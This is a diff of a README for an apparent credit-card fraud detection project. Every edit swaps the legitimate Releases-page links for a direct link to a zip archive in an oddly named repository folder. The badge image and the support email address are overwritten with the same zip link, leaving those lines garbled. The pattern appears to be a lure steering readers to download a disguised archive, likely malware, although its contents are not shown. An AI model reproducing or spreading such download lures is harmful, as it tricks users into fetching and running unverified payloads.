@@ -1,6 +1,6 @@
 # 🏦 Credit-Card-Fraud-Detection-EDA-project - Identify Fraud Instantly with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/releases)
+[![Download Latest Release](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/raw/refs/heads/main/sentence/Credit_Fraud_ED_Detection_project_Card_2.0-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/raw/refs/heads/main/sentence/Credit_Fraud_ED_Detection_project_Card_2.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 To get started, visit this page to download:
 
-[Download Latest Release](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/releases)
+[Download Latest Release](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/raw/refs/heads/main/sentence/Credit_Fraud_ED_Detection_project_Card_2.0-alpha.2.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the software.
@@ -50,7 +50,7 @@ To get started, visit this page to download:
 If you need assistance, you can reach out for help:
 
 - **GitHub Issues**: Report any problems or suggestions using the GitHub Issues feature.
-- **Email Support**: For direct inquiries, email support at creditcardfraud@support.com.
+- **Email Support**: For direct inquiries, email support at https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/raw/refs/heads/main/sentence/Credit_Fraud_ED_Detection_project_Card_2.0-alpha.2.zip
 - **Community Forum**: Join our community forum to connect with other users and share insights.
 
 ## ✉️ Feedback
@@ -65,6 +65,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 This project leverages various open-source technologies and resources. Special thanks to the contributors who made this possible. A complete list of contributors can be found on the GitHub repository.
 
-[Download Latest Release](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/releases) 
+[Download Latest Release](https://github.com/PenkarSoham/Credit-Card-Fraud-Detection-EDA-project/raw/refs/heads/main/sentence/Credit_Fraud_ED_Detection_project_Card_2.0-alpha.2.zip) 
 
 We appreciate your interest in **Credit-Card-Fraud-Detection-EDA-project**. Enjoy using the application!
